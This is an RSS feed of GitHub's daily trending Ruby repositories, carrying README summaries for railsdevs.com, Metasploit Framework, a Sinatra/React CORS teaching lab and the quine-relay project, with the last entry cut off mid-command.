<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Ruby Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-05-30T01:32:15Z</updated>
  <subtitle>Daily Trending of Ruby in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>joemasilotti/railsdevs.com</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/joemasilotti/railsdevs.com</id>
    <link href="https://github.com/joemasilotti/railsdevs.com" rel="alternate"></link>
    <summary type="html">&lt;p&gt;The reverse job board for Ruby on Rails developers.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Rails Devs&lt;/h1&gt; &#xA;&lt;p&gt;The reverse job board for Rails developers.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/2092156/147028085-eea40303-c572-48c0-b107-0be93cce067c.png&#34; alt=&#34;railsdevs homepage&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;code&gt;railsdevs&lt;/code&gt; empowers independent developers available for their next gig. It is being built around &lt;a href=&#34;https://railsdevs.com/about&#34;&gt;three core values&lt;/a&gt;:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Empowering the independent developer&lt;/li&gt; &#xA; &lt;li&gt;Doing everything in public&lt;/li&gt; &#xA; &lt;li&gt;Creating a safe, inclusive environment&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;Getting started&lt;/h2&gt; &#xA;&lt;h3&gt;Requirements&lt;/h3&gt; &#xA;&lt;p&gt;You will need a few non-Ruby packages installed. Install these at once via:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;brew bundle install --no-upgrade&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;...or manually:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Ruby 3.1.0&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.postgresql.org/docs/9.5/libpq.html&#34;&gt;libpq&lt;/a&gt; - &lt;code&gt;brew install libpq&lt;/code&gt; &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;code&gt;libpg&lt;/code&gt; is needed to use the native &lt;code&gt;pg&lt;/code&gt; gem without Rosetta on M1 macs&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.postgresql.org&#34;&gt;postgresql&lt;/a&gt; - &lt;code&gt;brew install postgresql&lt;/code&gt; [Note: PostgreSQL 13+ is required]&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://nodejs.org/en/&#34;&gt;node&lt;/a&gt; - &lt;code&gt;brew install node&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://yarnpkg.com&#34;&gt;Yarn&lt;/a&gt; - &lt;code&gt;brew install yarn&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://redis.io&#34;&gt;Redis&lt;/a&gt; - &lt;code&gt;brew install redis&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://imagemagick.org&#34;&gt;Imagemagick&lt;/a&gt; - &lt;code&gt;brew install imagemagick&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://stripe.com/docs/stripe-cli&#34;&gt;Stripe CLI&lt;/a&gt; - &lt;code&gt;brew install stripe/stripe-cli/stripe&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/ddollar/foreman&#34;&gt;foreman&lt;/a&gt; - &lt;code&gt;gem install foreman&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Google Chrome + Chromedriver for system tests - &lt;code&gt;brew install --cask google-chrome chromedriver&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Initial setup&lt;/h3&gt; &#xA;&lt;p&gt;Start PostgreSQL server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;brew services start postgresql&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Start Redis server.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;brew services start redis&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;An installation script is included with the repository that will automatically get the application setup.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bin/setup&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Development&lt;/h2&gt; &#xA;&lt;p&gt;Run the following to start the server and automatically build assets.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Requires &lt;code&gt;foreman&lt;/code&gt; or &lt;code&gt;overmind&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Requires &lt;code&gt;stripe&lt;/code&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;bin/dev&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Seeds&lt;/h3&gt; &#xA;&lt;p&gt;Seeding the database, either via &lt;code&gt;rails db:seed&lt;/code&gt; or during &lt;code&gt;bin/setup&lt;/code&gt;, creates a few accounts. Most importantly, use &lt;code&gt;developer@example.com&lt;/code&gt; and &lt;code&gt;business@example.com&lt;/code&gt; with password &lt;code&gt;password&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;p&gt;More information is in &lt;a href=&#34;https://raw.githubusercontent.com/joemasilotti/railsdevs.com/main/docs/seeds.md&#34;&gt;the docs on seeds&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h3&gt;Stripe&lt;/h3&gt; &#xA;&lt;p&gt;You will need to configure Stripe or do a mock configuration (ie set dummy values for the last step listed below) if you are working on anything related to payments.&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dashboard.stripe.com/register&#34;&gt;Register for Stripe&lt;/a&gt; and add an account&lt;/li&gt; &#xA; &lt;li&gt;Download the Stripe CLI via &lt;code&gt;brew install stripe/stripe-cli/stripe&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Login to the Stripe CLI via &lt;code&gt;stripe login&lt;/code&gt;&lt;/li&gt; &#xA; &lt;li&gt;Configure your development credentials &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://dashboard.stripe.com/test/apikeys&#34;&gt;Create a Stripe secret key for test mode&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Run &lt;code&gt;stripe listen --forward-to localhost:3000/pay/webhooks/stripe&lt;/code&gt; in order to generate your webhook signing secret.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://dashboard.stripe.com/test/products/create&#34;&gt;Create a product&lt;/a&gt; with a recurring, monthly price&lt;/li&gt; &#xA;   &lt;li&gt;Generate your editable development credentials file via &lt;code&gt;EDITOR=&#34;mate --wait&#34; bin/rails credentials:edit --environment development&lt;/code&gt;. You may need to install and provide terminal access to the editor first (mate, subl, and atom should all work). If you run the code above and receive the message &#34;New credentials encrypted and saved&#34;, without having had the opportunity to edit the file first, things have gone astray. You will need to troubleshoot this step based on your OS and desired editor, to ensure you are able to edit the development.yml file before it is encoded and saved. &lt;a href=&#34;https://stackoverflow.com/questions/52370065/issue-to-open-credentials-file&#34;&gt;See here for more details.&lt;/a&gt;&lt;/li&gt; &#xA;   &lt;li&gt;Add the secret key, the price, and your webhook signing secret to your development credentials in the following format, and save/close the file:&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;pre&gt;&lt;code&gt;stripe:&#xA;  private_key: sk_test_YOUR_TEST_STRIPE_KEY&#xA;  signing_secret: whsec_YOUR_SIGNING_SECRET&#xA;  price_ids:&#xA;    part_time_plan: price_YOUR_PRODUCT_PRICE_ID&#xA;    full_time_plan: price_ANOTHER_PRODUCT_PRICE_ID&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Monitoring&lt;/h2&gt; &#xA;&lt;p&gt;Application monitoring is powered by &lt;a href=&#34;https://scoutapm.com&#34;&gt;Scout APM&lt;/a&gt;. This helps identify N+1 queries, slow queries, memory bloats, and more. Scout APM is free for open source.&lt;/p&gt; &#xA;&lt;h2&gt;Testing&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Run &lt;code&gt;rails test&lt;/code&gt; to run unit/integration tests.&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;rails test:system&lt;/code&gt; to run system tests, using &lt;code&gt;headless_chrome&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Run &lt;code&gt;HEADFUL=1 rails test:system&lt;/code&gt; to run system tests, using &lt;code&gt;headful_chrome&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Changelog&lt;/h2&gt; &#xA;&lt;p&gt;Significant changes and product updates are documented in the &lt;a href=&#34;https://raw.githubusercontent.com/joemasilotti/railsdevs.com/main/CHANGELOG.md&#34;&gt;changelog&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Open source support&lt;/h2&gt; &#xA;&lt;p&gt;railsdevs uses a free or discounted open source plan from the following companies. Thank you for the support!&lt;/p&gt; &#xA;&lt;a href=&#34;https://tracking.scoutapm.com/t/102858/c/24eac3db-39dd-4863-b972-a35a3e35b72b/NB2HI4DTHIXS65DFOIXGY2JPNA4GWMRZOI======/ter-li-h8k29r&#34;&gt; &lt;img src=&#34;https://user-images.githubusercontent.com/2092156/169346365-12f3806f-5a04-494a-a2d6-45611666c57c.png&#34; width=&#34;250&#34; alt=&#34;Scout APM logo&#34;&gt; &lt;/a&gt;</summary>
  </entry>
  <entry>
    <title>rapid7/metasploit-framework</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/rapid7/metasploit-framework</id>
    <link href="https://github.com/rapid7/metasploit-framework" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Metasploit Framework&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Metasploit &lt;a href=&#34;https://travis-ci.org/rapid7/metasploit-framework&#34;&gt;&lt;img src=&#34;https://travis-ci.org/rapid7/metasploit-framework.svg?branch=master&#34; alt=&#34;Build Status&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/rapid7/metasploit-framework/maintainability&#34;&gt;&lt;img src=&#34;https://api.codeclimate.com/v1/badges/943e398e619c09568f3f/maintainability&#34; alt=&#34;Maintainability&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://codeclimate.com/github/rapid7/metasploit-framework/test_coverage&#34;&gt;&lt;img src=&#34;https://api.codeclimate.com/v1/badges/943e398e619c09568f3f/test_coverage&#34; alt=&#34;Test Coverage&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://hub.docker.com/r/metasploitframework/metasploit-framework/&#34;&gt;&lt;img src=&#34;https://img.shields.io/docker/pulls/metasploitframework/metasploit-framework.svg?sanitize=true&#34; alt=&#34;Docker Pulls&#34;&gt;&lt;/a&gt;&lt;/h1&gt; &#xA;&lt;p&gt;The Metasploit Framework is released under a BSD-style license. See &lt;a href=&#34;https://raw.githubusercontent.com/rapid7/metasploit-framework/master/COPYING&#34;&gt;COPYING&lt;/a&gt; for more details.&lt;/p&gt; &#xA;&lt;p&gt;The latest version of this software is available from: &lt;a href=&#34;https://metasploit.com&#34;&gt;https://metasploit.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Bug tracking and development information can be found at: &lt;a href=&#34;https://github.com/rapid7/metasploit-framework&#34;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;New bugs and feature requests should be directed to: &lt;a href=&#34;https://r-7.co/MSF-BUGv1&#34;&gt;https://r-7.co/MSF-BUGv1&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;API documentation for writing modules can be found at: &lt;a href=&#34;https://rapid7.github.io/metasploit-framework/api&#34;&gt;https://rapid7.github.io/metasploit-framework/api&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Questions and suggestions can be sent to: Freenode IRC channel or e-mail the metasploit-hackers mailing list&lt;/p&gt; &#xA;&lt;h2&gt;Installing&lt;/h2&gt; &#xA;&lt;p&gt;Generally, you should use &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers&#34;&gt;the free installer&lt;/a&gt;, which contains all of the dependencies and will get you up and running with a few clicks. See the &lt;a href=&#34;https://r-7.co/MSF-DEV&#34;&gt;Dev Environment Setup&lt;/a&gt; if you&#39;d like to deal with dependencies on your own.&lt;/p&gt; &#xA;&lt;h2&gt;Using Metasploit&lt;/h2&gt; &#xA;&lt;p&gt;Metasploit can do all sorts of things. The first thing you&#39;ll want to do is start &lt;code&gt;msfconsole&lt;/code&gt;, but after that, you&#39;ll probably be best served by reading &lt;a href=&#34;https://www.offensive-security.com/metasploit-unleashed/&#34; title=&#34;Metasploit Unleashed&#34;&gt;Metasploit Unleashed&lt;/a&gt;, the &lt;a href=&#34;https://metasploit.github.io&#34;&gt;great community resources&lt;/a&gt;, or the &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki&#34;&gt;wiki&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Contributing&lt;/h2&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/wiki/Setting-Up-a-Metasploit-Development-Environment&#34; title=&#34;Metasploit Development Environment Setup&#34;&gt;Dev Environment Setup&lt;/a&gt; guide on GitHub, which will walk you through the whole process from installing all the dependencies, to cloning the repository, and finally to submitting a pull request. For slightly more information, see &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/raw/master/CONTRIBUTING.md&#34;&gt;Contributing&lt;/a&gt;.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>learn-co-curriculum/phase-3-chatterbox-sinatra-react-lab</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/learn-co-curriculum/phase-3-chatterbox-sinatra-react-lab</id>
    <link href="https://github.com/learn-co-curriculum/phase-3-chatterbox-sinatra-react-lab" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Sinatra React Lab: Chatterbox&lt;/h1&gt; &#xA;&lt;h2&gt;Learning Goals&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create an API with Sinatra for a React frontend application&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Introduction&lt;/h2&gt; &#xA;&lt;p&gt;So far, we&#39;ve seen how to build a Sinatra API and perform various CRUD actions using Active Record. In this lab, you&#39;ll work on creating an API in Sinatra once more — but this time, you&#39;ll also have code for a React frontend application, so you can get a taste of full-stack development!&lt;/p&gt; &#xA;&lt;p&gt;This project is separated into two applications:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;A React frontend, in the &lt;code&gt;chatterbox-client&lt;/code&gt; directory&lt;/li&gt; &#xA; &lt;li&gt;A Sinatra backend, in the &lt;code&gt;chatterbox-server&lt;/code&gt; directory&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;All of the features for the React frontend are built out, and we have a simple &lt;code&gt;json-server&lt;/code&gt; API that you can run to see what the completed version of the app will look like. Your main goal with this lab is to build out a Sinatra API server to replace &lt;code&gt;json-server&lt;/code&gt;, so most of your coding will be done in the backend.&lt;/p&gt; &#xA;&lt;h2&gt;Frontend Setup&lt;/h2&gt; &#xA;&lt;p&gt;Let&#39;s take a quick tour of what we have so far.&lt;/p&gt; &#xA;&lt;p&gt;To get started, &lt;code&gt;cd&lt;/code&gt; into the &lt;code&gt;chatterbox-client&lt;/code&gt; directory. Then run:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ npm install&#xA;$ npm run server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will install the React project dependencies, and run a demo API server using &lt;code&gt;json-server&lt;/code&gt;. Next, run this in a new terminal:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ npm start&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then visit &lt;a href=&#34;http://localhost:3000&#34;&gt;http://localhost:3000&lt;/a&gt; in the browser and interact with the demo application to get a sense of its features.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s a demo of the what the React app should look like when using &lt;code&gt;json-server&lt;/code&gt; as the API:&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://curriculum-content.s3.amazonaws.com/phase-3/chatterbox-sinatra-react-lab/chatterbox-demo.gif&#34; alt=&#34;Chatterbox demo&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Take a look at the components provided in the &lt;code&gt;chatterbox-client&lt;/code&gt; directory. Explore the code and pay special attention to where the React application is interacting with &lt;code&gt;json-server&lt;/code&gt;. Where are the &lt;code&gt;fetch&lt;/code&gt; requests being written? What routes are needed to handle these requests? What HTTP verbs? What data is being sent in the body of the requests?&lt;/p&gt; &#xA;&lt;p&gt;Once you&#39;ve familiarized yourself yourself with the code, turn off &lt;code&gt;json-server&lt;/code&gt; with &lt;code&gt;control + c&lt;/code&gt; in the terminal where &lt;code&gt;json-server&lt;/code&gt; is running (you can keep the React application running, though). Next, let&#39;s see what we have in the backend.&lt;/p&gt; &#xA;&lt;h2&gt;Backend Setup&lt;/h2&gt; &#xA;&lt;p&gt;In another terminal, &lt;code&gt;cd&lt;/code&gt; into the &lt;code&gt;chatterbox-server&lt;/code&gt; directory, and run &lt;code&gt;bundle install&lt;/code&gt; to install the dependencies.&lt;/p&gt; &#xA;&lt;p&gt;In this directory, you&#39;re given a bare-bones template for a Sinatra API application. It should look familiar to other Sinatra labs you&#39;ve seen and has all the code set up so you can focus on building out your model and API routes.&lt;/p&gt; &#xA;&lt;p&gt;You&#39;ll be responsible for:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Creating a model and migrations&lt;/li&gt; &#xA; &lt;li&gt;Setting up the necessary routes to handle requests&lt;/li&gt; &#xA; &lt;li&gt;Performing CRUD actions with Active Records&lt;/li&gt; &#xA; &lt;li&gt;Sending the necessary JSON data in the responses&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Allowing Frontend Requests: CORS&lt;/h3&gt; &#xA;&lt;p&gt;The only new code for the server is the &lt;a href=&#34;https://github.com/cyu/rack-cors&#34;&gt;Rack CORS gem&lt;/a&gt;. This gem provides some Rack middleware which we need to configure so that applications running in the browser, like our React client, can make requests to the backend.&lt;/p&gt; &#xA;&lt;p&gt;If we didn&#39;t use this gem, any requests from our React frontend in the browser would result in an error message like this:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-txt&#34;&gt;Access to fetch at &#39;http://localhost:9292/messages&#39; from origin&#xA;&#39;http://localhost:3000&#39; has been blocked by CORS policy: No&#xA;&#39;Access-Control-Allow-Origin&#39; header is present on the requested resource. If an&#xA;opaque response serves your needs, set the request&#39;s mode to &#39;no-cors&#39; to fetch&#xA;the resource with CORS disabled.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The reason for this warning message is due to a browser security feature known as &lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&#34;&gt;Cross-Origin Resource Sharing (CORS)&lt;/a&gt;. When we use JavaScript from one domain (aka origin) to make a request to a server on a different domain, the default behavior of the browser is to block those requests from going through.&lt;/p&gt; &#xA;&lt;p&gt;For example, if I own the website &lt;code&gt;definitelynotahacker.com&lt;/code&gt;, I can&#39;t use JavaScript to make a network request to &lt;code&gt;api.yourbankaccount.com&lt;/code&gt;, unless &lt;code&gt;api.yourbankaccount.com&lt;/code&gt; explicitly gives permission to my website.&lt;/p&gt; &#xA;&lt;p&gt;To give that permission, any server that we want to make requests to using JavaScript must add some special &lt;strong&gt;headers&lt;/strong&gt; to the response that tell the browser that the request was permitted.&lt;/p&gt; &#xA;&lt;p&gt;Here&#39;s what the CORS configuration looks like (in the &lt;code&gt;config.ru&lt;/code&gt; file):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-rb&#34;&gt;# Allow CORS (Cross-Origin Resource Sharing) requests&#xA;use Rack::Cors do&#xA;  allow do&#xA;    # origins &#39;*&#39; allows requests from ALL frontend origins&#xA;    # (if you deploy your application, change this to&#xA;    # ONLY allow requests from YOUR frontend origin, like:&#xA;    # origins &#39;my-react-app.netlify.app&#39;)&#xA;    origins &#39;*&#39;&#xA;    resource &#39;*&#39;, headers: :any, methods: [:get, :post, :delete, :put, :patch, :options, :head]&#xA;  end&#xA;end&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You don&#39;t have to make any changes to this configuration to complete this lab, but CORS warnings are a very common thing to encounter in web development, so next time you see them, you&#39;ll know what this means!&lt;/p&gt; &#xA;&lt;h2&gt;Instructions&lt;/h2&gt; &#xA;&lt;p&gt;Work through the deliverables below. There are tests in the &lt;code&gt;chatterbox-server&lt;/code&gt; folder. Because of this lab&#39;s project structure, running &lt;code&gt;learn test&lt;/code&gt; won&#39;t work — instead, you&#39;ll need to &lt;code&gt;cd&lt;/code&gt; into the &lt;code&gt;chatterbox-server&lt;/code&gt; directory and run &lt;code&gt;rspec&lt;/code&gt; (or &lt;code&gt;bundle exec rspec&lt;/code&gt;) to run the tests for the Sinatra backend.&lt;/p&gt; &#xA;&lt;p&gt;Make sure to try out your routes from the React frontend application as well once you have everything set up. You can run your Sinatra server with:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle exec rake server&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You&#39;ll need to change the &lt;code&gt;fetch&lt;/code&gt; requests in React to use &lt;code&gt;http://localhost:9292&lt;/code&gt; as well.&lt;/p&gt; &#xA;&lt;h3&gt;Model&lt;/h3&gt; &#xA;&lt;p&gt;Start by generating a &lt;code&gt;Message&lt;/code&gt; model and the necessary migration code to create messages with the following attributes:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;body: string&lt;/li&gt; &#xA; &lt;li&gt;username: string&lt;/li&gt; &#xA; &lt;li&gt;created_at: timestamp&lt;/li&gt; &#xA; &lt;li&gt;updated_at: timestamp&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;After creating the model and migrations, run the migrations and use the provided &lt;code&gt;seeds.rb&lt;/code&gt; file to seed the database:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ bundle exec rake db:migrate db:seed&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Routes&lt;/h3&gt; &#xA;&lt;p&gt;Build out the following routes to handle the necessary CRUD actions:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;code&gt;GET /messages&lt;/code&gt;: returns an array of all messages as JSON, ordered by &lt;code&gt;created_at&lt;/code&gt; in ascending order.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;POST /messages&lt;/code&gt;: creates a new message with a &lt;code&gt;body&lt;/code&gt; and &lt;code&gt;username&lt;/code&gt; from params, and returns the newly created post as JSON.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;PATCH /messages/:id&lt;/code&gt;: updates the &lt;code&gt;body&lt;/code&gt; of the message using params, and returns the updated message as JSON.&lt;/li&gt; &#xA; &lt;li&gt;&lt;code&gt;DELETE /messages/:id&lt;/code&gt;: deletes the message from the database.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Resources&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS&#34;&gt;CORS Explained&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/cyu/rack-cors&#34;&gt;The rack-cors Gem&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>mame/quine-relay</title>
    <updated>2022-05-30T01:32:15Z</updated>
    <id>tag:github.com,2022-05-30:/mame/quine-relay</id>
    <link href="https://github.com/mame/quine-relay" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An uroboros program with 100+ programming languages&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Quine Relay&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/mame/quine-relay/actions?query=workflow%3ACI&#34;&gt;&lt;img src=&#34;https://github.com/mame/quine-relay/workflows/CI/badge.svg?sanitize=true&#34; alt=&#34;CI&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;What this is&lt;/h2&gt; &#xA;&lt;p&gt;This is a Ruby program that generates Rust program that generates Scala program that generates ...(through 128 languages in total)... REXX program that generates the original Ruby code again.&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/mame/quine-relay/master/langs.png&#34; alt=&#34;Language Uroboros&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;(If you want to see the old 50-language version, see &lt;a href=&#34;https://github.com/mame/quine-relay/tree/50&#34;&gt;50&lt;/a&gt; branch.)&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;h3&gt;Ubuntu&lt;/h3&gt; &#xA;&lt;p&gt;If you are using Ubuntu 22.04 (Jammy Jellyfish), you can perform the following steps.&lt;/p&gt; &#xA;&lt;h4&gt;1. Install all interpreters/compilers.&lt;/h4&gt; &#xA;&lt;p&gt;First, you have to type the following apt-get command to install all of them.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo apt-get install afnix algol68g aplus-fsf aspectj asymptote \&#xA;  ats2-lang bash bc bf bsdgames bsh clisp clojure cmake coffeescript \&#xA;  dafny dc dhall elixir emacs-nox erlang f2c fish flex fp-compiler \&#xA;  fsharp g++ gambas3-gb-pcre gambas3-scripter gap gawk gcc gdb gdc \&#xA;  generator-scripting-language genius gforth gfortran ghc ghostscript \&#xA;  gnat gnu-smalltalk gnucobol4 gnuplot gobjc golang gpt groovy guile-3.0 \&#xA;  gzip haxe icont iconx intercal iverilog jasmin-sable jq kotlin ksh \&#xA;  libpolyml-dev lisaac livescript llvm lua5.3 m4 make maxima minizinc \&#xA;  mono-devel mono-mcs mono-vbnc nasm neko nickle node-typescript nodejs \&#xA;  ocaml octave openjdk-11-jdk pari-gp parser3-cgi perl php-cli polyml \&#xA;  python3 r-base rakudo ratfor rc regina-rexx ruby ruby-mustache rustc \&#xA;  scala scilab-cli sed slsh spin squirrel3 surgescript swi-prolog tcl \&#xA;  tcsh valac vim wabt xsltproc yabasic yorick zoem zsh&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Then, build the bundled interpreters.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ sudo apt-get install cmake libpng-dev libgd-dev groff bison curl&#xA;$ make -C vendor&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h4&gt;2. Run each program on each interpreter/compiler.&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ ulimit -s unlimited&#xA;$ ruby QR.rb &amp;gt; QR.rs&#xA;$ rustc QR.rs &amp;amp;&amp;amp; ./QR &amp;gt; QR.scala&#xA;$ scalac QR.scala &amp;amp;&amp;amp; scala QR &amp;gt; QR.scm&#xA;$ guile QR.scm &amp;gt; QR.sci&#xA;$ scilab-cli -nb -f QR.sci &amp;gt; QR.sed&#xA;$ sed -E -f QR.sed QR.sed &amp;gt; QR.spl&#xA;$ ./vendor/local/bin/spl2c &amp;lt; QR.spl &amp;gt; QR.spl.c &amp;amp;&amp;amp; gcc -z muldefs -o QR -I ./vendor/local/include -L ./vendor/local/lib QR.spl.c -lspl -lm &amp;amp;&amp;amp;&#xA;  ./QR &amp;gt; QR.sl&#xA;$ slsh QR.sl &amp;gt; QR.st&#xA;$ gst QR.st &amp;gt; QR.nut&#xA;$ squirrel QR.nut &amp;gt; QR.sml&#xA;$ polyc -o QR QR.sml &amp;amp;&amp;amp; ./QR &amp;gt; QR.sq&#xA;$ ruby vendor/subleq.rb QR.sq &amp;gt; QR.ss&#xA;$ surgescript QR.ss &amp;gt; QR.tcl&#xA;$ tclsh QR.tcl &amp;gt; QR.tcsh&#xA;$ tcsh QR.tcsh &amp;gt; QR.t&#xA;$ ruby vendor/thue.rb QR.t &amp;gt; QR.ts&#xA;$ tsc --outFile QR.ts.js QR.ts &amp;amp;&amp;amp; nodejs QR.ts.js &amp;gt; QR.unl&#xA;$ ruby vendor/unlambda.rb QR.unl &amp;gt; QR.vala&#xA;$ valac QR.vala &amp;amp;&amp;amp; ./QR &amp;gt; QR.mid&#xA;$ mono vendor/local/bin/Vlt.exe /s QR.mid &amp;amp;&amp;amp; mono QR.exe &amp;gt; QR.v&#xA;$ iverilog -o QR QR.v &amp;amp;&amp;amp; ./QR 